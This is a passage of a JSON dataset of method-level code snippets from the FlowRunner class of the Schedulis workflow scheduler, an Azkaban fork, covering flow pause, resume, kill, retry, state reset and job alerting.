"FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "evaluateExpression", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean evaluateExpression(final String expression) {    boolean result = false;    final ScriptEngineManager sem = new ScriptEngineManager();    final ScriptEngine se = sem.getEngineByName(\"JavaScript\");    // Restrict permission using the two-argument form of doPrivileged()    try {      final Object object = AccessController.doPrivileged(              new PrivilegedExceptionAction<Object>() {                @Override                public Object run() throws ScriptException {                  return se.eval(expression);                }              },              new AccessControlContext(                      new ProtectionDomain[]{new ProtectionDomain(null, null)}) // no permissions      );      if (object != null) {        result = (boolean) object;      }    } catch (final Exception e) {      this.logger.error(\"Failed to evaluate the condition.\", e);    }    this.logger.info(\"Condition is evaluated to \" + result);    return result;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "collectOutputProps", "params": ["ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "Props", "snippet": "  private Props collectOutputProps(final ExecutableNode node) {    Props previousOutput = null;    // Iterate the in nodes again and create the dependencies    for (final String dependency : node.getInNodes()) {      ExecutableNode executableNode = node.getParentFlow().getExecutableNode(dependency);      // FIXME\u00a0If it is preparing to execute the submitted task, it needs to inherit the parameters of the output of the last executed job stream. In order to solve the problem that after the task execution fails, the new task cannot inherit the parameters output by the old task.\t  Props output = executableNode.getOutputProps();      int lastExecId = (int)this.flow.getOtherOption().getOrDefault(\"lastExecId\", -1);      try {        if(output == null && lastExecId != -1 && !this.flow.getLastNsWtss()) {          String jobId = executableNode.getId();          if(executableNode instanceof ExecutableFlowBase){            ExecutableFlowBase baseFlow = (ExecutableFlowBase)executableNode;            jobId = baseFlow.getFlowId();          }          output = this.executorLoader.fetchExecutionJobOutputProps(lastExecId, jobId);          logger.debug(jobId + \", output: \" + output);        }      }catch (ExecutorManagerException e){        logger.error(\"fetch job output param failed\", e);      }      if (output != null && output.size() != 0) {        output = Props.clone(output);        output.setParent(previousOutput);        previousOutput = output;      }    }    return previousOutput;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "createJobRunner", "params": ["ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "JobRunner", "snippet": "  private JobRunner createJobRunner(final ExecutableNode node) {    // Load job file.    final File path = new File(this.execDir, node.getJobSource());    final JobRunner jobRunner =            new JobRunner(node, path.getParentFile(), this.executorLoader,                    this.jobtypeManager, this.azkabanProps);    if (this.watcher != null) {      jobRunner.setPipeline(this.watcher, this.pipelineLevel);    }    if (this.validateUserProxy) {      jobRunner.setValidatedProxyUsers(this.proxyUsers);    }    jobRunner.setDelayStart(node.getDelayedExecution());    jobRunner.setLogSettings(this.logger, this.jobLogFileSize, this.jobLogNumFiles);    jobRunner.addListener(this.listener);    if (JobCallbackManager.isInitialized()) {      jobRunner.addListener(JobCallbackManager.getInstance());    }    configureJobLevelMetrics(jobRunner);    return jobRunner;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "configureJobLevelMetrics", "params": ["JobRunner"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void configureJobLevelMetrics(final JobRunner jobRunner) {    this.logger.info(\"Configuring Azkaban metrics tracking for jobrunner object\");    if (MetricReportManager.isAvailable()) {      final MetricReportManager metricManager = MetricReportManager.getInstance();      // Adding NumRunningJobMetric listener      jobRunner.addListener((NumRunningJobMetric) metricManager              .getMetricFromName(NumRunningJobMetric.NUM_RUNNING_JOB_METRIC_NAME));      // Adding NumFailedJobMetric listener      jobRunner.addListener((NumFailedJobMetric) metricManager              .getMetricFromName(NumFailedJobMetric.NUM_FAILED_JOB_METRIC_NAME));    }    jobRunner.addListener(JmxJobMBeanManager.getInstance());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "pause", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void pause(final String user) {    synchronized (this.mainSyncObj) {      if (!this.flowFinished) {        this.logger.info(\"Flow paused by \" + user);        this.flowPaused = true;        this.flow.setStatus(Status.PAUSED);        updateFlow();      } else {        this.logger.info(\"Cannot pause finished flow. Called by user \" + user);      }    }    interrupt();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "failedPause", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void failedPause() {    if (!this.flowFinished && !this.flowPaused) {      this.logger.info(\"paused flow, execId: \" + this.flow.getExecutionId());      this.flowPaused = true;      this.flow.setStatus(Status.PAUSED);      updateFlow();    } else {      this.logger.info(\"Cannot pause finished flow, execId: \" + this.flow.getExecutionId());    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "resetFlowStatus", "params": ["ExecutableFlowBase", "ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void resetFlowStatus(final ExecutableFlowBase base, final ExecutableNode executableNode) {    int failedNodes = 0;    for(ExecutableNode node: base.getExecutableNodes()){      if(node.getStatus().equals(Status.FAILED_WAITING) || node.getStatus().equals(Status.FAILED_FINISHING)){        if(!executableNode.getNestedId().equals(node.getNestedId())) {          failedNodes++;        }      }    }    if(failedNodes == 0){      //\u5c06flow\u72b6\u6001\u6539\u4e3aRunning, \u5b50flow\u6709job\u6ca1\u8dd1\u5b8c\uff0c\u7236\u7ea7flow\u80af\u5b9a\u8fd8\u662frunning      base.setStatus(Status.RUNNING);    }    if(base.getParentFlow() != null) {      resetFlowStatus(base.getParentFlow(), executableNode);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setSkipFailedJob", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String setSkipFailedJob(List<String> skipFailedJobs) {    if(this.flowKilled){      logger.warn(\"flow has been killed, can not skipped the failed jobs\");      return \"flow has been killed.\";    }    synchronized (this.mainSyncObj){      String message = null;      if(this.flowKilled){        logger.warn(\"flow has been killed, can not skipped the failed jobs\");        return \"\u4f5c\u4e1a\u6d41\u5df2\u88abkilled\uff0c\u4e0d\u80fd\u6267\u884c\u8df3\u8fc7\u4efb\u52a1\u3002\";      }      ExecutableNode node = this.flow.getExecutableNodePath(skipFailedJobs.get(0));      if(node != null && !node.getStatus().equals(Status.FAILED_WAITING)){        message = \"job: \" + skipFailedJobs.get(0) + \", \u72b6\u6001\u4e0d\u662fFAILED_WAITING\uff0c\u4e0d\u80fd\u8bbe\u7f6e\u8df3\u8fc7\u6267\u884c\u3002\";        logger.warn(message);        return message;      }      stopKillFlowTrigger();      //\u8fd8\u539fflow\u72b6\u6001\u4e3aRunning      resetFlowStatus(node.getParentFlow(), node);      if(FlowRunner.this.failureAction == FailureAction.FAILED_PAUSE) {        ExecutableNode executableNode = this.flow.getExecutableNodePath(skipFailedJobs.get(0));        if(!executableNode.getStatus().equals(Status.FAILED_WAITING)){          logger.warn(\"job: \" + skipFailedJobs.get(0) + \"\u4e0d\u662fFAILED_WAITING\uff0c\u4e0d\u80fd\u8bbe\u7f6e\u5931\u8d25\u8df3\u8fc7\u3002\");          message = \"job: \" + skipFailedJobs.get(0) + \"\u4e0d\u662fFAILED_WAITING\uff0c\u4e0d\u80fd\u8bbe\u7f6e\u5931\u8d25\u8df3\u8fc7\u3002\";        }        if(executableNode.getStatus().equals(Status.FAILED_WAITING)){          executableNode.setStatus(Status.FAILED_SKIPPED);          executableNode.setUpdateTime(System.currentTimeMillis());          updateFlow();          FlowRunner.this.finishedNodes.add(executableNode);        }        for (String nodeName : skipFailedJobs) {          this.failedNodes.remove(nodeName);        }        interrupt();      } else{        logger.warn(\"\u4f5c\u4e1a\u6d41\u4e0d\u662f\u6682\u505c\u72b6\u6001\u4e0d\u80fd\u8bbe\u7f6e\u4e86\u5931\u8d25\u8df3\u8fc7\u3002\");        message = \"\u4f5c\u4e1a\u6d41\u4e0d\u662f\u6682\u505c\u72b6\u6001\u4e0d\u80fd\u8bbe\u7f6e\u4e86\u5931\u8d25\u8df3\u8fc7\u3002\";      }      return message;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "resume", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void resume(final String user) {    synchronized (this.mainSyncObj) {      if (!this.flowPaused) {        this.logger.info(\"Cannot resume flow that isn't paused\");      } else {        this.logger.info(\"Flow resumed by \" + user);        this.flowPaused = false;        if (this.flowFailed) {          this.flow.setStatus(Status.FAILED_FINISHING);        } else if (this.flowKilled) {          this.flow.setStatus(Status.KILLING);        } else {          this.flow.setStatus(Status.RUNNING);        }        updateFlow();      }    }    interrupt();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "superKill", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void superKill(String user){    this.logger.info(\"execId: \" + this.execId + \", flow killed by \" + user);    synchronized (this.mainSyncObj) {      if (this.flowFinished) {        this.logger.info(\"Flow already finished.\");        return;      }      if (this.watcher != null) {        this.logger.info(\"Watcher is attached. Stopping watcher.\");        this.watcher.stopWatcher();        this.logger            .info(\"Watcher cancelled status is \" + this.watcher.isWatchCancelled());      }      this.flow.setStatus(Status.KILLED);      this.flow.setEndTime(System.currentTimeMillis());      final long time = System.currentTimeMillis();      for (final ExecutableNode node : this.flow.getExecutableNodes()) {        switch (node.getStatus()) {          case SUCCEEDED:          case FAILED:          case KILLED:          case SKIPPED:          case DISABLED:          case FAILED_SKIPPED:          case CANCELLED:          case RETRIED_SUCCEEDED:            continue;            // case UNKNOWN:          case READY:            node.setStartTime(time);            node.setEndTime(time);            node.setUpdateTime(time);            node.setStatus(Status.CANCELLED);            break;          default:            node.setEndTime(time);            node.setUpdateTime(time);            node.setStatus(Status.KILLED);            break;        }      }      this.flowFinished = true;      interrupt();    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "kill", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void kill(final String user) {    this.logger.info(\"Flow killed by \" + user);    kill();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "kill", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void kill() {    synchronized (this.mainSyncObj) {      if (this.flowKilled) {        return;      }      this.logger.info(\"Kill has been called on flow \" + this.execId);      this.flow.setStatus(Status.KILLING);      // If the flow is paused, then we'll also unpause      this.flowPaused = false;      this.flowKilled = true;      if (this.watcher != null) {        this.logger.info(\"Watcher is attached. Stopping watcher.\");        this.watcher.stopWatcher();        this.logger                .info(\"Watcher cancelled status is \" + this.watcher.isWatchCancelled());      }      this.logger.info(\"Killing \" + this.activeJobRunners.size() + \" jobs.\");      for (final JobRunner runner : this.activeJobRunners) {        this.logger.info(\"killing job:\" + runner.getNode().getNestedId());        runner.kill();        ExecutableNode node = runner.getNode();        // FIXME\u00a0New function. When the job stream is terminated, the FAILED_WAITING state job needs to be set to the killed state.        if(node.getStatus().equals(Status.FAILED_WAITING)){          this.logger.info(String.format(\"change job: %s , old status %s to KILLED\", node.getNestedId(), node.getStatus()));          node.setStatus(Status.KILLED);          node.setUpdateTime(System.currentTimeMillis());        }      }      /**       * \u56e0\u4e3a\u8bbe\u7f6e\u4e86\u5931\u8d25\u6682\u505c\u7684\u65f6\u5019\u6ca1\u6709\u5c06\u6267\u884c\u5931\u8d25\u7684\u8282\u70b9\u6dfb\u52a0\u5230finishedNodes\u91cc\uff0c\u5bfc\u81f4\u524d\u53f0\u70b9\u51fbkill\u7684\u65f6\u5019\u5931\u8d25\u4e86       * \u73b0\u5728kill\u7684\u65f6\u5019\u5c06\u5931\u8d25\u8282\u70b9\u91cd\u65b0\u6dfb\u52a0\u5230finishedNodes\u91cc       */      if(FlowRunner.this.failureAction == FailureAction.FAILED_PAUSE) {        for(ExecutableNode failedNode: FlowRunner.this.failedNodes.values()){          this.logger.info(String.format(\"change job: %s , old status %s\", failedNode.getNestedId(), failedNode.getStatus()));          if(failedNode.getStatus().equals(Status.FAILED_WAITING)){            failedNode.setStatus(Status.KILLED);            failedNode.setUpdateTime(System.currentTimeMillis());          }          FlowRunner.this.finishedNodes.add(failedNode);        }      }      updateFlow();    }    interrupt();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "retryFailures", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void retryFailures(final String user) {    synchronized (this.mainSyncObj) {      this.logger.info(\"Retrying failures invoked by \" + user);      // FIXME\u00a0Add judgment. If the job stream has been completed, you cannot retry execution.      if(this.flowFinished){        this.logger.info(\"this flow was finished.\");        return;      }      // FIXME\u00a0If you click to retry the task, you need to cancel the thread that timed out the job stream.      stopKillFlowTrigger();      this.retryFailedJobs = true;      interrupt();    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "stopKillFlowTrigger", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void stopKillFlowTrigger(){    if(killFlowTrigger != null && killFlowTrigger.isAlive()) {      killFlowTrigger.stopKillFLowTrigger();      FlowRunner.this.isTriggerStarted = false;      logger.info(\"stop killing workflow.\");    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setDependentlinkFailed", "params": ["ExecutableNode", "boolean"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setDependentlinkFailed(ExecutableNode node, boolean flag){    if(FlowLoaderUtils.isAzkabanFlowVersion20(this.flow.getAzkabanFlowVersion())){      return;    }    node.setDependentlinkFailed(flag);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "resetFailedState", "params": ["ExecutableFlowBase", "List<ExecutableNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void resetFailedState(final ExecutableFlowBase flow,                                final List<ExecutableNode> nodesToRetry) {    // bottom up    final LinkedList<ExecutableNode> queue = new LinkedList<>();    for (final String id : flow.getEndNodes()) {      final ExecutableNode node = flow.getExecutableNode(id);      queue.add(node);    }    long maxStartTime = -1;    while (!queue.isEmpty()) {      final ExecutableNode node = queue.poll();      final Status oldStatus = node.getStatus();      maxStartTime = Math.max(node.getStartTime(), maxStartTime);      setDependentlinkFailed(node, false);      this.logger.info(\"reset node: \" + node.getNestedId() + \" oldStatus is:\" + oldStatus + \" isDependentlinkFailed: \" + node.isDependentlinkFailed());      final long currentTime = System.currentTimeMillis();      if (Status.isSucceeded(node.getStatus())) {        // This is a candidate parent for restart        nodesToRetry.add(node);        continue;      } else if (node.getStatus() == Status.RUNNING) {        continue;      } else if (node.getStatus() == Status.KILLING) {        continue;      }else if (node.getStatus() == Status.FAILED_RETRYING) {        continue;      } else if (node.getStatus() == Status.SKIPPED) {        node.setStatus(Status.DISABLED);        node.setEndTime(-1);        node.setStartTime(-1);        node.setUpdateTime(currentTime);      } else if (node instanceof ExecutableFlowBase) {        final ExecutableFlowBase base = (ExecutableFlowBase) node;        switch (base.getStatus()) {          case CANCELLED:            node.setStatus(Status.READY);            node.setEndTime(-1);            node.setStartTime(-1);            node.setUpdateTime(currentTime);            // Break out of the switch. We'll reset the flow just like a normal            // node            break;          case KILLED:          case FAILED:          case FAILED_FINISHING:            resetFailedState(base, nodesToRetry);            continue;          case READY:          case DISABLED:            //\u7ee7\u7eed\u627e\u5176inNodes            break;          default:            // Continue the while loop. If the job is in a finished state that's            // not            // a failure, we don't want to reset the job.            continue;        }      } else if (node.getStatus() == Status.CANCELLED) {        // Not a flow, but killed        node.setStatus(Status.READY);        node.setStartTime(-1);        node.setEndTime(-1);        node.setUpdateTime(currentTime);      } else if (node.getStatus() == Status.FAILED              || node.getStatus() == Status.KILLED              || node.getStatus().equals(Status.FAILED_WAITING)              || node.getStatus().equals(Status.FAILED_SKIPPED)) {        node.resetForRetry();        nodesToRetry.add(node);      }      if (!(node instanceof ExecutableFlowBase)              && node.getStatus() != oldStatus) {        this.logger.info(\"Resetting job '\" + node.getNestedId() + \"' from \"                + oldStatus + \" to \" + node.getStatus());      }      for (final String inId : node.getInNodes()) {        final ExecutableNode nodeUp = flow.getExecutableNode(inId);        queue.add(nodeUp);      }    }    // At this point, the following code will reset the flow    final Status oldFlowState = flow.getStatus();    if (maxStartTime == -1) {      // Nothing has run inside the flow, so we assume the flow hasn't even      // started running yet.      flow.setStatus(Status.READY);    } else {      flow.setStatus(Status.RUNNING);      // Add any READY start nodes. Usually it means the flow started, but the      // start node has not.      for (final String id : flow.getStartNodes()) {        final ExecutableNode node = flow.getExecutableNode(id);        if (node.getStatus() == Status.READY                || node.getStatus() == Status.DISABLED) {          nodesToRetry.add(node);        }      }    }    flow.setUpdateTime(System.currentTimeMillis());    flow.setEndTime(-1);    this.logger.info(\"Resetting flow '\" + flow.getNestedId() + \"' from \"            + oldFlowState + \" to \" + flow.getStatus());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "interrupt", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void interrupt() {    // FIXME\u00a0When the thread is not started, the job stream is terminated at this time, and a null pointer exception occurs. The solution is to increase non-empty judgment.    if(this.flowRunnerThread != null) {      this.flowRunnerThread.interrupt();    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "isKilled", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isKilled() {    return this.flowKilled;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "isFlowFinished", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isFlowFinished(){    return this.flowFinished;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getExecutableFlow", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow getExecutableFlow() {    return this.flow;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getFlowLogFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File getFlowLogFile() {    return this.logFile;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getJobLogFile", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File getJobLogFile(final String jobId, final int attempt) {    final ExecutableNode node = this.flow.getExecutableNodePath(jobId);    final File path = new File(this.execDir, node.getJobSource());    final String logFileName = JobRunner.createLogFileName(node, attempt);    final File logFile = new File(path.getParentFile(), logFileName);    if (!logFile.exists()) {      return null;    }    return logFile;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getJobAttachmentFile", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File getJobAttachmentFile(final String jobId, final int attempt) {    final ExecutableNode node = this.flow.getExecutableNodePath(jobId);    final File path = new File(this.execDir, node.getJobSource());    final String attachmentFileName =            JobRunner.createAttachmentFileName(node, attempt);    final File attachmentFile = new File(path.getParentFile(), attachmentFileName);    if (!attachmentFile.exists()) {      return null;    }    return attachmentFile;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getJobMetaDataFile", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File getJobMetaDataFile(final String jobId, final int attempt) {    final ExecutableNode node = this.flow.getExecutableNodePath(jobId);    final File path = new File(this.execDir, node.getJobSource());    final String metaDataFileName = JobRunner.createMetaDataFileName(node, attempt);    final File metaDataFile = new File(path.getParentFile(), metaDataFileName);    if (!metaDataFile.exists()) {      return null;    }    return metaDataFile;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "isRunnerThreadAlive", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isRunnerThreadAlive() {    if (this.flowRunnerThread != null) {      return this.flowRunnerThread.isAlive();    }    return false;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "isThreadPoolShutdown", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isThreadPoolShutdown() {    return this.executorService.isShutdown();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getNumRunningJobs", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getNumRunningJobs() {    return this.activeJobRunners.size();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getExecutionId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecutionId() {    return this.execId;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getActiveJobRunners", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<JobRunner>", "snippet": "  public Set<JobRunner> getActiveJobRunners() {    return ImmutableSet.copyOf(this.activeJobRunners);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "failedWaitingJobHandle", "params": ["ExecutableNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void failedWaitingJobHandle(ExecutableNode node){    try {      if(node.getStatus().equals(Status.FAILED_WAITING) && FlowRunner.this.failureAction == FailureAction.FAILED_PAUSE){        FlowRunner.this.failedNodes.put(node.getNestedId(), node);        if(!FlowRunner.this.isTriggerStarted){          killFlowTrigger = new KillFlowTrigger(FlowRunner.this, FlowRunner.this.logger);          killFlowTrigger.start();          FlowRunner.this.isTriggerStarted = true;        }        ExecutionControllerUtils.handleFlowPausedAlert(FlowRunner.this.flow, alerterHolder, node.getNestedId());      } else if(Status.isStatusSucceeded(node.getStatus()) && FlowRunner.this.failureAction == FailureAction.FAILED_PAUSE){        FlowRunner.this.failedNodes.remove(node.getNestedId());      }    }catch (RuntimeException re){      FlowRunner.this.logger.error(\"add failed node failed\", re);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "handleJobAndEmbeddedFlowExecTimeoutAlter", "params": ["JobRunner", "EventData"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void  handleJobAndEmbeddedFlowExecTimeoutAlter(final JobRunner jobRunner, final EventData eventData){    // add job level checker    final TriggerManager triggerManager = ServiceProvider.SERVICE_PROVIDER            .getInstance(TriggerManager.class);    // \u83b7\u53d6\u975e\u5b50\u5de5\u4f5c\u6d41\u7684job\u8d85\u65f6\u544a\u8b66job\u540d    List<String> jobAlerts = SlaOption.getJobLevelSLAOptions(FlowRunner.this.flow).stream()            .map(x -> (String)x.getInfo().get(\"JobName\")).collect(Collectors.toList());    String parentFlow = jobRunner.getNode().getParentFlow().getNestedId();    FlowRunner.this.logger.info(\"alert jobs is \" + jobAlerts.toString() + \" job name: \" + eventData.getNestedId() + \" parent flow \" + parentFlow);    // job\u8d85\u65f6\u544a\u8b66    if(jobAlerts.contains(eventData.getNestedId())) {      triggerManager.addTrigger(FlowRunner.this.flow.getExecutionId(), SlaOption.getJobLevelSLAOptions(FlowRunner.this.flow), eventData.getNestedId());    }    // \u83b7\u53d6\u5b50flow    List<String> embeddedFlowAlerts = SlaOption.getJobLevelSLAOptions(FlowRunner.this.flow).stream()            .filter(x -> x.getInfo().getOrDefault(SlaOption.INFO_EMBEDDED_ID, null) != null)            .map(x -> (String)x.getInfo().get(\"JobName\")).collect(Collectors.toList());    // \u5b50flow\u8d85\u65f6\u544a\u8b66    for(String embeddedFlow: embeddedFlowAlerts){      if(parentFlow.equals(embeddedFlow) || parentFlow.startsWith(embeddedFlow + \":\")){        if(embeddedFlowTimeOutSlaFlag.get(embeddedFlow) == null) {          triggerManager.addTrigger(FlowRunner.this.flow.getExecutionId(), SlaOption.getJobLevelSLAOptions(FlowRunner.this.flow), embeddedFlow);          embeddedFlowTimeOutSlaFlag.put(embeddedFlow, true);        }      }    }  }", "url": 